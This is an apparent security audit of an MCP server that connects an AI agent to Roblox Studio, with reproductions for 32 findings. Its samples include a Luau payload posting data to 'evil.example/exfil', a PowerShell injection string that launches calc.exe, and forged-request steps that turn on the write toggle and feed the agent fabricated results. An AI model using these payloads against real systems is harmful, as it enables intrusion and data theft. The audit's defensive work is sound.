# Cubes Roblox MCP — security & correctness audit

**Scope:** `src/` (the MCP server half) at commit `2533818`, plus docs.
**Date:** 2026-09-11
**Method:** full read of all 16 `src/*.ts` modules, then empirical verification against a
running server driven by a stub Studio plugin (long-polls `/poll`, echoes commands,
reports a configurable `writeEnabled`). Every finding marked **Confirmed** was reproduced
against the real built `dist/` — not inferred from reading.

**What is NOT in scope:** the Roblox Studio plugin. `.gitignore` line 29 excludes `roblox/`
("distributed separately, never committed"), so the Luau half could not be read or run.
Findings that depend on plugin behaviour are marked **Plugin-dependent** and say exactly
what could and could not be established.

Baseline health: `tsc --noEmit` is clean, `npm run build` succeeds, no dependency
vulnerabilities in a 2-package tree.

---

## Summary

Severity spread after the verification pass: **1 critical, 4 high, 11 medium, 16 low = 32**.
Findings 27-32 were added by that pass; four originals were re-graded and two corrected. The
per-finding notes below carry a **[verify]** line where anything changed.

| # | Severity | Finding | Status |
|---|---|---|---|
| 1 | **Critical** | The bridge trusts anyone who can reach the port: `/rpc` has no Origin/Host/Content-Type check and a two-name write gate — and (finding 27) the gate is forgeable anyway | Confirmed |
| 2 | **High** | "Allow writes" is bypassable from the MCP surface: `evalTool` defaults to `write: false`, and `wait_until` `loadstring`s caller-supplied Luau | Confirmed |
| 3 | **High** | PowerShell command injection via `screenshot.insets` — nothing validates tool args against `inputSchema` | Confirmed |
| 4 | Medium | HTTP bridge reads request bodies with no size cap | Confirmed · re-graded High→Medium |
| 5 | Medium | A dead long-poll socket silently eats one command and stalls the caller for the full timeout | Confirmed |
| 6 | Medium | One bad protocol handshake blocks every `send()` until the next good poll (~25s), and is re-triggerable | Confirmed · impact corrected |
| 7 | Medium | Inline Luau lint can never run — `cwd` points at a directory the repo no longer ships | Confirmed |
| 8 | Medium | `search_tools` reports tools as unlocked that the same turn evicts — best matches dropped first | Confirmed |
| 9 | Medium | `isError` is never set, so MCP clients read every failure as a success | Confirmed |
| 10 | Medium | `resources/read` bypasses the write gate entirely | Confirmed |
| 11 | Low | Concurrent `profile_update` loses 9 of 10 writes; the code comment claims the opposite | Confirmed · re-graded Medium→Low |
| 12 | Low | `luaJson` emits `\uXXXX`, which Luau cannot parse — generated script fails to compile | Confirmed · re-graded Medium→Low |
| 13 | Medium | `script_edit` overwrites script source with no confirm gate and no lint | Confirmed |
| 14 | Low | `instance_duplicate.count` is uncapped | Confirmed · re-graded Medium→Low |
| 15 | Medium | Screenshot: no size cap, temp files never cleaned, full-monitor default | Confirmed |
| 16-26 | Low | Fail-open op classification, leaks, doc drift, no CI — see below | Confirmed |
| 27 | **High** | An unauthenticated `/poll` forges the write toggle ON without the user touching the panel | Confirmed (verification pass) |
| 28 | **High** | `/poll` + `/result` are unauthenticated both ways: a local process steals commands and forges results | Confirmed (verification pass) |
| 29 | Medium | The command queue has no cap — an attacker floods it and starves the agent | Confirmed (verification pass) |
| 30 | Medium | `README.md:172` says writes are always-on, contradicting the code and the rest of the docs | Confirmed (verification pass) |
| 31 | Low | Some `pro.ts` builders leave a ChangeHistoryService recording open on error | Plausible (code-read; plugin-dependent) |
| 32 | Low | `/poll` and `/rpc` lack the malformed-body try/catch `/result` has | Confirmed (verification pass) |

---

## Verification pass

A second agent re-derived every finding independently against the built `dist/` and attacked
the headline. Net result: no finding was WRONG at the level of "the code does not do that,"
and thirteen spot-checked line citations were exact. Six changes came out of it, all folded
into the findings below:

- **Finding 6 was overstated.** "Sticky forever / permanently disables the server" is false —
  a connected plugin's next poll clears it. Measured here at **25047ms**. It is a re-triggerable
  ~25s DoS, not a permanent kill. Corrected in place.
- **Finding 20 had one factual error.** `roblox/` was **never** git-tracked (`git log` over all
  history: 0 files under `roblox/` ever added); commit `2533818` only added the `.gitignore`
  rule and rewrote the README. It was not "removed." Everything else in 20 holds.
- **Findings 4, 11, 12, 14 re-graded down** on consequence, not mechanism (each mechanism
  reproduced exactly). 4 is availability-only on a local dev process; 11's `updateProfile` is
  dead code and loses only advisory notes; 12 is a loud `compile_error` on rare input and is
  injection-safe; 14 needs an explicit huge `count` and an agent could loop in `run_code` anyway.
- **The audit under-covered the trust boundary it named as the whole problem.** It audited only
  the inbound `/rpc` direction. Findings **27-30** cover what an unauthenticated `/poll` and
  `/result` actually permit — forging the write toggle, stealing commands, spoofing results, and
  the README line that says the write model doesn't exist in this build. 27 is verified here
  (see below); it makes finding 1's "writes OFF" framing beside the point.

---

## 1. Critical — any web page can drive `/rpc` into Studio

**Files:** `src/bridge.ts:263-311` (the `/rpc` handler), `src/bridge.ts:380-395` (`readJson`)

Five independent checks that would each have stopped this are all absent:

| Check | Present? |
|---|---|
| `Origin` header validated | no |
| `Host` header validated | no |
| `Content-Type` enforced | no — `readJson` parses any body |
| Write-mode toggle honoured | **only for the literal strings `"eval"` and `"mutate"`** (`bridge.ts:273`) |
| Token required | no — `CUBES_MCP_RPC_TOKEN` is opt-in and unset by default |

`bridge.ts:273` is the core mistake:

```ts
const isWrite = tool === "eval" || tool === "mutate";
```

`/rpc` forwards *any* `tool` string straight to the plugin. Every plugin-native write tool
is outside that two-name allowlist — including `tune`, whose own description
(`src/seed.ts:1411`) reads *"Run arbitrary Luau inside the RUNNING playtest's server
DataModel."* The gate is also case-sensitive, so `EVAL` and ` eval` slip past it too.

Because `readJson` ignores `Content-Type`, a `text/plain` POST qualifies as a CORS
*simple request*: no preflight, so the browser sends it. The response is opaque to the
attacker, but the side effect has already run. Even simpler, a plain
`<form method=POST enctype="text/plain">` needs no JavaScript at all and is exempt from
CORS entirely. Separately, the missing `Host` check means a DNS-rebinding page becomes
same-origin and can read responses too.

**[verify] The "any web page" claim carries one unstated assumption.** The reproductions
below use a server-side `fetch`, which enforces no CORS or localhost policy — it proves the
*server* accepts the request, not that a *browser* would send it. The CORS-simple-request
reasoning above is sound, but modern Chromium and Safari also gate requests from a public
page to `127.0.0.1` (Private/Local Network Access). On a browser that enforces it, the
web-page vector is blocked or permission-prompted; the assumption is unquantified because no
browser was available here. What needs *no* assumption: a page served from localhost, an
Electron/extension context, an older browser, and — the vector that moots the whole debate —
**any local process on the machine**, which findings 27-28 build on. `127.0.0.1` binding
(`bridge.ts:110`) stops LAN/remote attackers (verified) but not browser CSRF or DNS rebinding.

**[verify] The `tune` example is weaker than it reads, and the framing is off.** `tune` also
requires a playtest already running (`seed.ts:1411`, `no_playtest` otherwise) — not a one-shot
payload. And "the documented default" for writes-OFF is contradicted by `README.md:172`, which
says writes are always-on in this build (finding 30). The sharper statement of finding 1 does
not depend on the toggle at all: with writes ON — the normal posture — `/rpc` is an
unauthenticated arbitrary-`eval` endpoint. Measured, writes ON, cross-origin:
`POST /rpc {tool:"eval"} -> 200`, plugin received the Luau.

**Reproduction** (`Allow writes` OFF, `CUBES_MCP_RPC_TOKEN` unset):

```
POST /rpc from https://evil.example -> 200 {"ok":true,"result":{"echoed":"tune"}}

What Studio was asked to run:
  tune | {"luau":"game:GetService(\"HttpService\"):PostAsync(\"https://evil.example/exfil\", game.PlaceId)"}
```

Gate coverage measured against a connected plugin with writes OFF:

```
eval                   HTTP 403  BLOCKED by write gate
mutate                 HTTP 403  BLOCKED by write gate
tune                   HTTP 200  PASSED THROUGH TO STUDIO
playtest_play          HTTP 200  PASSED THROUGH TO STUDIO
character_teleport     HTTP 200  PASSED THROUGH TO STUDIO
playtest_set_players   HTTP 200  PASSED THROUGH TO STUDIO
snapshot               HTTP 200  PASSED THROUGH TO STUDIO
event_watch            HTTP 200  PASSED THROUGH TO STUDIO
```

**Plugin-dependent:** whether `tune` actually executes the Luau depends on the plugin's
dispatch table, which this repo does not contain. What is fully established server-side is
that the payload reaches the plugin unauthenticated, from a cross-origin web request, with
the user's write toggle off.

**Fix direction:** reject requests carrying an `Origin` header; require `Host` to be
`127.0.0.1`/`localhost` on the configured port; require `Content-Type: application/json`;
replace the two-name allowlist with a deny-by-default list of read-only tools; consider
making the RPC token mandatory rather than opt-in.

---

## 2. High — "Allow writes" is bypassable from the MCP tool surface

**Files:** `src/registry.ts:183-192` (`evalTool`), `src/server.ts:776-782` (`isWriteTool`),
`src/seed.ts:1952-1987` (`wait_until`), `src/seed.ts:446-508` (`debug_highlight`),
`src/seed.ts:749-764` (`debug_clear`)

`evalTool` defaults `write` to `false` (`registry.ts:186`), but every `evalTool` ships
generated Luau down the same `eval` channel that `run_code` uses. The `write` flag is a
hand-maintained label, and several tools that mutate the DataModel are unlabelled.

Measured with a connected plugin reporting `writeEnabled: false`:

```
--- baseline: tools the gate DOES catch ---
BLOCKED         mutate
BLOCKED         run_code
BLOCKED         script_edit

--- specialists that reach Studio's eval path with writes OFF ---
REACHED-STUDIO  wait_until
REACHED-STUDIO  debug_highlight
REACHED-STUDIO  debug_clear
REACHED-STUDIO  test_run
REACHED-STUDIO  step_frames
REACHED-STUDIO  selection_set
```

The worst of these is `wait_until`, declared `write: false` at `seed.ts:1958`:

```lua
local checkSrc = "return (" .. a.predicate .. ")"
local fn, err = loadstring(checkSrc)
```

`predicate` is a caller-supplied string. `(function() <anything> end)()` is a valid
predicate. So a tool explicitly flagged as non-writing evaluates arbitrary Luau in the
plugin's elevated context — exactly what `run_code` is gated for.

`debug_highlight` and friends are less dramatic but still real DataModel writes:
`Instance.new("Folder")`, `Instance.new("Highlight")`, `hl.Parent = folder`, and
`debug_clear` calls `f:Destroy()` on a Workspace child.

**Fix direction:** invert the default — `evalTool` should be `write: true` unless a tool
opts out — and give `wait_until` a real expression evaluator or drop it. `selection_set`
and `test_run` deserve an explicit decision either way rather than an accidental default.

---

## 3. High — PowerShell command injection via `screenshot.insets`

**Files:** `src/vision.ts:46-79` (`studioWindowPs`), `src/vision.ts:139-157` (handler),
`src/server.ts:380` (args are cast, never validated)

`studioWindowPs` interpolates the inset values straight into a PowerShell script:

```ts
$x = $rect.L + ${l}
$w = ($rect.Rt - $rect.L) - ${l} - ${r}
```

The JSON Schema declares `insets.top` as `type: "number"`, but nothing enforces it. The
low-level MCP SDK `Server` does not validate `arguments` against `inputSchema`, and
`server.ts:377` does a bare cast:

```ts
const args = (req.params.arguments ?? {}) as Record<string, unknown>;
```

**Reproduction** — captured the script the server actually spawned, with
`insets.top = "0\n Write-Host PWNED; Start-Process calc.exe #"`:

```powershell
$x = $rect.L + 0
$y = $rect.T + 0
 Write-Host PWNED; Start-Process calc.exe #
$w = ($rect.Rt - $rect.L) - 0 - 0
$h = ($rect.B - $rect.T) - 0
 Write-Host PWNED; Start-Process calc.exe # - 0
```

Injected statements land at top level and execute on Windows.

Note the general shape: **no tool argument anywhere in this server is validated against its
declared schema.** `insets` is where that becomes code execution, but the same gap lets
`read({limit: "; DROP TABLE --"})` through untouched, and it is what makes finding 14
possible.

**Fix direction:** coerce insets with `Number()` and reject non-finite values; more broadly,
add a schema-validation pass (ajv, or the SDK's `McpServer` + zod wrapper) in front of every
handler.

---

## 4. Medium — unbounded request bodies on the bridge

**[verify] Re-graded High→Medium.** Reproduced (89MB→538MB on one 64MB POST), but the impact
is availability-only: a local dev process OOMs and the MCP client restarts it. No data loss,
no privilege gain, not reachable off-host.

**File:** `src/bridge.ts:380-395`

`readJson` accumulates chunks with no `Content-Length` check, no byte cap, and no
`req.destroy()` on overflow. Measured against a live bridge:

```
server RSS 64MB -> 474MB after ONE 64MB POST
```

~7x amplification (chunk array, `Buffer.concat`, the UTF-8 string, then the parsed object).
Combined with finding 1 this is remotely reachable, and a handful of parallel posts will OOM
the server. `/poll`, `/result` and `/rpc` all share this path.

**Fix direction:** cap at a few MB, destroy the socket past the cap, and reject an
oversized `Content-Length` before reading.

---

## 5. Medium — a dead long-poll socket eats a command and stalls the caller

**File:** `src/bridge.ts:318-348` (`handlePoll`)

`handlePoll` registers a waiter in `this.waiters` and removes it on exactly one path: the
25s timer. There is no `res.on("close")` / `req.on("aborted")` handler. When Studio dies or
the socket resets, the dead waiter stays queued. The next `send()` shifts it, calls
`res.end(...)` on a destroyed socket (a silent no-op), and the command is gone — it never
returns to `this.queue`, so a reconnecting plugin never sees it.

**Reproduction:**

```
step 1: the ONLY plugin poll parks on the bridge
        waiters parked: 1
step 2: Studio dies — socket aborted, no res.on('close') handler
step 3: server queues a command; it is handed to the DEAD response
step 4: plugin reconnects immediately and polls for work
        reconnected poll -> HTTP 204 after 25009ms, command received: NONE
        queued depth now: 0
result : studio_timeout
```

Every Studio crash, Studio restart, or network blip during a long poll costs exactly one
silently dropped tool call plus a full 30s stall.

**Fix direction:** `res.on("close", ...)` to drop the waiter; on a write failure, push the
command back onto `this.queue` instead of discarding it.

---

## 6. Medium — one bad handshake blocks `send()` for ~25s, re-triggerably

**[verify] Impact corrected.** The original heading ("sticky forever") and body ("permanently
disables the server for the session") were wrong. `bridge.ts:191` clears the flag on *every*
good poll, and a connected plugin re-polls at least every `POLL_HOLD_MS` (25s), so the
poisoning window is bounded. It is a re-triggerable ~25s DoS (an attacker re-posting once a
second holds it down) plus a confusing-error source — not a permanent kill. The mechanism is
otherwise as described.

**File:** `src/bridge.ts:119-128`, `src/bridge.ts:176-191`

`_protocolMismatch` is set on any `/poll` with a wrong or missing `protocol` field, and is
cleared only by a subsequent good poll. Until then `send()` rejects everything up front.
Any process that POSTs a malformed body to `/poll` — including the unauthenticated path in
finding 1 — blocks the server until the real plugin's next poll:

```
poisoned. health.protocolMismatch: {"expected":1,"got":999}
read right after      -> plugin_version_mismatch
mismatch cleared after 25047ms (the legit plugin's next poll)
read after recovery   -> {"echoed":"read"}
```

The user-facing message also tells them to rebuild from `roblox/plugin.project.json`
(`bridge.ts:124`) — a path this repo does not contain (finding 20).

**Fix direction:** treat the mismatch as a property of the last poll, not sticky state, or
expire it against `lastSeen`.

---

## 7. Medium — inline Luau lint can never run

**File:** `src/lint.ts:19`, `src/lint.ts:91`

```ts
const ROBLOX_DIR = join(dirname(fileURLToPath(import.meta.url)), "..", "roblox");
...
spawn(SELENE_BIN, [file, "--display-style", "json"], { cwd: ROBLOX_DIR });
```

`.gitignore:29` excludes `roblox/`. Nobody who clones this repo has that directory, so the
spawn fails on the **cwd**, before the binary is even looked up:

```
repo has roblox/ dir: false
cwd = repo root (exists)                        -> ok
cwd = repo/roblox (lint.ts ROBLOX_DIR, deleted) -> spawn error: ENOENT
lintLuau result: {"error":"lint unavailable: spawn selene ENOENT"}
```

Installing selene does not help. `src/lint.ts:14` also cites `roblox/selene.toml` for the
Roblox std — also gone, so even with a valid cwd the lint would run without the Roblox
standard library.

The failure is silent by design (`lint.ts:78-79` degrades to `{ error }`), so every
`mutate` that writes script source reports a `lint` entry that looks like a transient
tooling blip rather than a permanently dead feature. README advertises inline lint as a
headline property of `mutate`.

**Fix direction:** default the cwd to the project root, make the selene config path
configurable, and surface "lint not configured" once at startup instead of per call.

---

## 8. Medium — `search_tools` lies about what it unlocked

**Files:** `src/server.ts:502-526` (`handleSearchTools`), `src/session.ts:72-98` (`evict`),
`src/server.ts:483-487`

`handleSearchTools` unlocks every match and returns *"They are now in your tool list."*
`evict()` then runs at the end of the same `tools/call` (`server.ts:485`) and trims
specialists to a cap of 8. Nothing reconciles the two.

```
server SAYS unlocked: debug_clear, debug_highlight, debug_axes, debug_label, debug_bounds,
                      spawn_marker, debug_error, terrain_clear, selection_set, script_read,
                      playtest_result, sound_play
server MESSAGE     : Unlocked 12 tool(s): ... They are now in your tool list.
actually in tools/list: search_tools, read, screenshot, mutate, run_code, debug_bounds,
                      spawn_marker, debug_error, terrain_clear, selection_set, script_read,
                      playtest_result, sound_play
>>> claimed-but-absent: 4 -> debug_clear, debug_highlight, debug_axes, debug_label
```

Two problems, not one:

1. The response contradicts `tools/list`. The agent is told it has tools it does not have.
2. **The evicted four are the four highest-ranked matches.** `evict` sorts by `lastUsed`
   (`session.ts:88`); within one turn every entry ties, so the sort is a no-op and `.slice(0, n)`
   takes the front of the array — which is ranked order. The best answers to the query are
   exactly the ones thrown away.

`limit` has no upper bound (`server.ts:508`), so this triggers on any `limit > 8`. It also
accumulates across turns: three default-limit searches in a session will start silently
dropping results.

**Fix direction:** run `evict` before building the response and report the surviving set;
clamp `limit` to the cap; sort eviction candidates so recency ties break toward *older*
unlocks, not higher-ranked ones.

---

## 9. Medium — `isError` is never set on failures

**File:** `src/server.ts:497`

Every response goes out as `{ content: [{ type: "text", text: JSON.stringify(payload) }] }`.
The MCP spec signals tool failure with `isError: true` on the result; without it, clients
treat protocol errors, bad args, and unknown tools as successful calls:

```
read               isError=undefined  payload-has-error=true  {"error":"studio_not_connected",...}
mutate             isError=undefined  payload-has-error=true  {"error":"bad_args",...}
run_code           isError=undefined  payload-has-error=true  {"error":"bad_args",...}
nonexistent_tool   isError=undefined  payload-has-error=true  {"error":"unknown_tool",...}
search_tools       isError=undefined  payload-has-error=true  {"error":"bad_args",...}
```

Any client with retry-on-error, error counting, or failure surfacing sees a clean run.

**Fix direction:** set `isError: true` whenever the payload carries an `error` key.

---

## 10. Medium — `resources/read` bypasses the write gate

**File:** `src/server.ts:341-372`

The write gate lives in the `CallToolRequestSchema` handler only. The resource handler
calls `bridge.send("eval", ...)` directly for `studio://overview` (`server.ts:351`) and
`studio://selection` (`server.ts:366`) — the same channel `/rpc` classifies as write-class.

```
tools/call run_code   -> {"error":"write_mode_disabled",...}
resources/read studio://overview      -> { "echoed": "eval" }
resources/read studio://selection     -> { "echoed": "eval" }
resources/read studio://errors/recent -> { "echoed": "diagnostics" }
```

The Luau in both is a fixed constant, so this is not itself an injection route. It matters
for two reasons: the gate's coverage is not what the README describes, and if the plugin
ever refuses `eval` while writes are off, `studio://overview` — the resource the README
tells agents to read first — breaks in the default posture. **Plugin-dependent:** which of
those two is true cannot be determined from this repo.

---

## 11. Low — concurrent profile writes are lost

**[verify] Re-graded Medium→Low.** Reproduced (1/10 survived), but it needs genuinely parallel
tool calls and loses only local advisory notes in `~/.cubesmcp`. Note also that `updateProfile`
— the function whose comment makes the false claim — is **dead code**: the handler inlines its
own load/save, so nothing calls it.

**File:** `src/profile.ts:108-121`, `src/seed.ts:885-916`

The doc comment on `updateProfile` says:

> Load → mutate via callback → save in one shot. Used by the `profile_update` tool so
> concurrent writes serialize through the same load-mutate-save cycle.

Nothing serializes. It is an unguarded async read-modify-write:

```
10 concurrent profile_update calls -> 1/10 survived: [ 'issue-8' ]
```

The `profile_update` handler (`seed.ts:885`) does not even use `updateProfile` — it inlines
`loadProfile` → `applyPatch` → `saveProfile`, same race.

Two smaller issues in the same file: `saveProfile` (`profile.ts:105`) uses a plain
`writeFile`, which truncates first — a crash mid-write corrupts the profile with no backup;
and `decisions` / `knownIssues` / `sessionLog` are append-only with no cap, so the file
grows without bound across sessions.

**Fix direction:** a per-placeId promise chain (or a lockfile) around load-mutate-save;
write to a temp file and `rename` for atomicity; cap the append-only arrays.

---

## 12. Low — `luaJson` emits escapes Luau cannot parse

**[verify] Re-graded Medium→Low.** The JS half is exact (a lone surrogate like `"\ud800"` also
triggers it), and `luaJson` is injection-safe — no input under 0x80 produces a raw quote or
newline. The failure is a loud `compile_error` on rare input, not silent corruption. Caveat:
the "Luau rejects `\uXXXX`" half is a language-spec claim; no Luau lexer was run on either the
original pass or the verification.

**File:** `src/registry.ts:225-230`

The comment asserts:

> the second stringify produces a JSON-quoted string literal that's also a valid Lua string
> literal (Lua double-quoted strings accept the same escape sequences JSON uses).

That is false for control characters outside JSON's five named escapes. JSON emits
`\u0007`; Luau expects `\u{7}` and rejects a bare `\uXXXX`:

```
tab                 -> "{\"s\":\"a\tb\"}"           ok
bell (0x07)         -> "{\"s\":\"a\u0007b\"}"       <-- compile error in Luau
vertical tab (0x0b) -> "{\"s\":\"a\u000bb\"}"       <-- compile error in Luau
NUL (0x00)          -> "{\"s\":\"a\u0000b\"}"       <-- compile error in Luau
form feed (0x0c)    -> "{\"s\":\"a\fb\"}"           ok
```

`luaJson` is the argument-passing mechanism for **all 33 `evalTool` specialists** (21 in `seed.ts`, 12 in `pro.ts`). Any arg
carrying such a byte — a `script_edit` find/replace string against a file with a stray
control char, a pasted `wait_until` predicate, a label — produces Luau that fails to compile,
surfacing as an opaque `compile_error` rather than a bad-input message.

**Fix direction:** post-process the literal, rewriting `\uXXXX` to Luau's `\u{XXXX}`, or
escape every byte below 0x20 as a decimal `\ddd` escape.

---

## 13. Medium — `script_edit` bypasses both mutate safety rails

**File:** `src/seed.ts:327-444`

`safety.ts:40` classifies writing `Source` as **`hard`**, requiring `confirm: true`:

```ts
if (op.op === "set") {
  return op.props && typeof op.props === "object" && "Source" in op.props ? "hard" : "soft";
}
```

`script_edit` does exactly that operation (`inst.Source = source`, `seed.ts:419`) through the
`eval` path, so it gets neither rail:

- **No confirm gate.** The identical change via `mutate` returns `needs_confirmation`.
- **No lint.** `lintScriptOps` (`server.ts:584-612`) only inspects ops with `props.Source`,
  so the tool purpose-built for editing scripts is the one script path that is never linted.
  (Moot today given finding 7, but it is a second independent gap.)

`script_edit` *is* `write: true`, so the Allow-writes toggle still applies — it is the
destructiveness confirmation that is missing, which is what protects a user's existing code
from being silently overwritten.

**Fix direction:** route `script_edit` through `ctx.handleMutate` as a `set`+`Source` op, or
have it call `assessDestructiveness` and `lintLuau` itself.

---

## 14. Low — `instance_duplicate.count` is uncapped

**[verify] Re-graded Medium→Low.** `count: 1e9` reaches the plugin unclamped — confirmed. But
the "non-numeric value" half of the original sentence is wrong: `for i = 1, "abc"` raises a
Luau error, it doesn't hang. And an agent that wants a million clones can already write the
loop in `run_code`. This is a guardrail gap, not a new capability.

**File:** `src/seed.ts:62`

```lua
for i = 1, (a.count or 1) do
  local c = src:Clone()
```

No bound. `instance_duplicate({ target: "Workspace.BigModel", count: 1000000 })` clones
inside a `ChangeHistoryService` recording and will hang Studio. The sibling tool
`parts_grid` caps at 50×50 with an explicit comment about exactly this (`seed.ts:106-111`),
so the omission looks accidental rather than deliberate. Reachable with a non-numeric or
absurd value because of finding 3's missing validation.

**Fix direction:** clamp server-side in the builder, matching `parts_grid`.

---

## 15. Medium — screenshot: unbounded payload, leaked temp files, over-broad default

**File:** `src/vision.ts:109-213`

Three separate problems in the one core tool:

- **No size cap.** The full PNG is base64'd into an MCP image block with no downscale and no
  byte ceiling (`vision.ts:188-205`). A 1440p capture is 1-3MB raw, ~1.4-4MB base64 —
  enough to blow a context window or a client's message limit in a single call.
- **Temp files leak.** `unlink` runs on every failure path (`vision.ts:172, 179, 207`) but
  **not on success** — the handler returns `savedTo: path` and leaves the file. One PNG per
  screenshot accumulates in the system temp dir for the life of the machine.
- **Default region is `full`**, the entire primary monitor. Whatever else the user has open
  — mail, credentials, unrelated windows — is captured and shipped to the model. Neither the
  tool description nor the README flags this.

Related: `screenshot` is a **core** tool, always present in `tools/list`, but is
Windows-only (`spawn("powershell.exe", ...)`, `vision.ts:85`). On macOS or Linux:

```
{"error":"screenshot_failed","message":"spawn powershell.exe ENOENT"}
```

README's setup section documents a macOS plugin path (`~/Documents/Roblox/Plugins`), so
macOS is a supported platform on which a core tool can never work. `src/lint.ts:20` already
does the platform branch correctly, so the convention exists — `vision.ts` just doesn't
follow it.

---

## 16-26. Low

**16 — `classifyOp` fails open.** `safety.ts:37-50` returns `"soft"` for any `op` verb it
does not recognise. If the plugin's mutate handler supports verbs the schema enum does not
list, they are unclassified and unconfirmed. Verified: `{op: "reparent", target: "Workspace"}`
→ `level=soft, needsConfirm=false`. Unknown verbs should classify as `hard`.

**17 — nuclear detection is exact-string only.** `NUCLEAR_SERVICES.has(target)`
(`safety.ts:46`) matches the bare name only:

```
bare service name                 -> level=nuclear  needsConfirm=true
dotted from game (game.Workspace) -> level=hard     needsConfirm=true
ref token pointing at Workspace   -> level=hard     needsConfirm=true
lowercase alias (workspace)       -> level=hard     needsConfirm=true
@id from same batch               -> level=hard     needsConfirm=true
```

All still require confirmation, so this is a message-accuracy bug rather than a hole — the
user is warned "delete 1 instance(s)" when the batch deletes a whole service. Worth fixing
because the wording is what the user's confirm decision rests on.

**18 — `cancelledOrder` never drains.** `bridge.ts:350-361` deletes the id from the `Set` on
a late `/result` but leaves it in the parallel array; the eviction loop (`bridge.ts:163`) is
driven by `Set.size`, which no longer counts it:

```
cancelled Set size : 1000 (capped)      cancelledOrder len : 1000
after 1000 late /result arrivals:
cancelled Set size : 0                  cancelledOrder len : 1000  <- never drains
```

Grows with total lifetime timeouts. Slow leak on a long-lived server.

**19 — `suggestNext("snapshot")` emits an empty follow-up.** `suggest.ts:176` reads
`p.snapshot ?? p.snapshotId`; the handler returns `{ name, path, instanceCount, capturedAt }`
(`seed.ts:1098-1109`). Neither key exists, so the "one-click follow-up" is
`{"call":"diff","args":{}}`. Should be `p.name`.

**20 — documentation drift.** *(Correction: `roblox/` was **never** git-tracked — 0 files under
it in all history — so `2533818` did not "remove" it; that commit only added the ignore rule and
rewrote the README. The drift is real regardless.)* The `roblox/` half is absent but the docs were
not:
- `CLAUDE.md:11,13,23,26-27,54-55` describes `roblox/`, `roblox/src/Transport.luau`,
  `roblox/src/StatusUi.luau` and a `rojo build plugin.project.json` command. None exist here.
- `CLAUDE.md:53` and `server.ts:24` both say **four** core tools and omit `screenshot`.
  README says five; the code has five (`session.ts:10`).
- README names `lighting_configure` and `script_create` as available specialists. Verified
  against the 58-entry registry: **neither exists** — `seed.ts:439-440` records that
  `script_create` was deliberately removed.
- `bridge.ts:124`, `lint.ts:14-15`, `vision.ts:17-20` all cite files the repo no longer ships.

**21 — no tests that run without Studio, no CI.** `package.json` exposes `test:e2e` and
`test:repl`, both of which require a live Studio with the plugin connected; there is no
`test` script. No `.github/` directory. Everything in this audit that is pure logic —
`safety.ts`, `snapshot-diff.ts`, `session.evict`, `luaJson`, `registry.search` — is unit
testable today with zero Roblox dependency.

**22 — yielding evals monopolise the bridge.** `wait_until` (up to 25s), `logs_wait_for` (up
to 25s) and `step_frames` (up to 600 frames) block on the plugin side while the bridge holds
a single command queue. Any other tool call queued behind one will burn its own 30s timeout.
**Plugin-dependent** — whether the plugin can poll while executing is not visible from here —
but the server-side default timeout (`bridge.ts:118`) leaves only a 5s margin over a 25s
yield, which is thin regardless.

**23 — post-listen server errors are swallowed.** `bridge.ts:109` registers
`this.httpServer.on("error", reject)`. After `listen` resolves, later errors call `reject` on
a settled promise and vanish. Log them instead.

**24 — `_writeEnabled` is never reset on disconnect.** `bridge.ts:192` only assigns when the
field is a boolean, and nothing clears it when the plugin stops polling. `writeEnabled`
(`bridge.ts:92`) is saved by the `connected` conjunction, but the stale flag means a
reconnecting plugin that omits the field inherits the previous session's toggle.

**25 — every payload is serialized three times.** `estTokens` (`server.ts:787`)
`JSON.stringify`s args and payload for the token estimate, then `server.ts:497` stringifies
the payload again for the wire. On a large `read` that is three full serializations per call.
`buildMeta` and the final stringify also sit **outside** the handler's try/catch
(`server.ts:448`, `server.ts:497`), so a payload that cannot be serialized throws out of the
request handler rather than returning a structured error.

**26 — history retains full arguments.** `memory.record` (`server.ts:457`) stores `args`
verbatim, including whole script sources from `mutate` ops, capped at 200 entries by count
(`memory.ts:44`) rather than by bytes. `historyView` strips args for display, but the raw
copies stay resident.

---

## Findings from the verification pass

These cover the direction the original audit missed: it audited the inbound `/rpc` call but
never asked what an unauthenticated `/poll` or `/result` permits. The bridge cannot tell the
real plugin from any other local poster, in either direction.

## 27. High — an unauthenticated `/poll` forges the write toggle ON

**File:** `src/bridge.ts:192`

```ts
if (typeof body?.writeEnabled === "boolean") this._writeEnabled = body.writeEnabled;
```

`/poll` is unauthenticated and reachable by the same CORS-simple / form-post shape as `/rpc`.
Any poster that sends `{ protocol: 1, writeEnabled: true }` flips the server's write toggle —
the user never touches the panel. This defeats the entire "promotion to write mode requires
user action" model (`DESIGN.md:442`) that findings 1-2 are framed around.

**Reproduction** (real plugin connected and reporting `writeEnabled: false` throughout):

```
user toggle OFF, real plugin polling.
  baseline cross-origin eval -> HTTP 403 write_mode_disabled
  bridge.writeEnabled -> false
attacker fires forged /poll {writeEnabled:true} ...
  bridge.writeEnabled now -> true      (user never touched the panel)
  cross-origin eval now  -> HTTP 200 {"ok":true,"result":{"echoed":"eval"}}
  real plugin still reports writeEnabled: false
  eval payloads plugin received: 1
```

The window closes at the real plugin's next poll (≤25s) and is re-openable at will — plenty
for a single scripted `eval`. This is the sharper form of finding 1: the write gate is not
just coarse, it is forgeable, so "writes OFF" is not a defense at all.

**Fix direction:** the toggle must come from a trusted channel, not an unauthenticated request
body. At minimum bind it to the same shared-secret the RPC token contemplates; better, carry
plugin identity on the poll.

## 28. High — `/poll` + `/result` are unauthenticated both ways: command theft and forged results

**File:** `src/bridge.ts:173-232`, `src/bridge.ts:350-377`

The server cannot distinguish the plugin from any other local poster. A forged poller receives
the agent's queued commands verbatim, and `/result` accepts an answer for any in-flight `id`
from anyone. So a local process can (a) exfiltrate every script source the agent reads or
writes, (b) black-hole commands, and (c) feed the agent fabricated ground truth about the
Studio state. The verification pass demonstrated a forged `/poll` receiving a `mutate` carrying
a script Source, then a forged `/result` returning `{"applied":true, ...,"note":"TOTALLY FINE"}`
that the agent accepted as real.

This also raises finding 5 from "a Studio crash costs one command" to "anyone local can make
the agent lose commands, or lie to it, on demand." For a browser attacker only (b) applies (the
poll response is opaque cross-origin); for a local process all three do.

**Fix direction:** authenticate the plugin end of the bridge — a per-session token the plugin
presents on `/poll` and echoes on `/result`, minted by the server and shown in the panel or
handed over out of band. Without it, no property of the bridge is trustworthy.

## 29. Medium — the command queue has no cap

**File:** `src/bridge.ts:153` (`this.queue.push(cmd)`)

Nothing bounds `this.queue`. 3000 unauthenticated `/rpc` posts leave 2999 commands queued
ahead of the agent's next call, which then times out at 30s while the plugin works through the
attacker's backlog first. Distinct from finding 4 (memory): this is starvation plus
attacker-directed execution ordering.

**Fix direction:** cap the queue, and drop or 503 past the cap.

